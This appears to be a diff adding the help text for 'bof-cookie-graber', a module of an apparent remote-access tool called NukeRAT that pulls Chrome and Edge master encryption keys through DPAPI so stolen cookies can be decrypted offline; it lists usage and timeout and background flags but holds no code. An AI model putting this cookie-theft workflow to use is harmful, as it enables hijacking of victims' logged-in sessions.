@@ -1,0 +1,16 @@
+ABOUT
+    Extracts WebKit master encryption keys from Chrome and Edge Local State
+    files via DPAPI. Dumps Edge key first, then Chrome key. Use the master
+    key with CookieProcessor.exe offline to decrypt cookies from the on disk
+    database.
+USAGE:
+    bof-cookie-graber
+EXAMPLES:
+    bof-cookie-graber
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-cookie-graber -w 60
+    bof-cookie-graber -bg
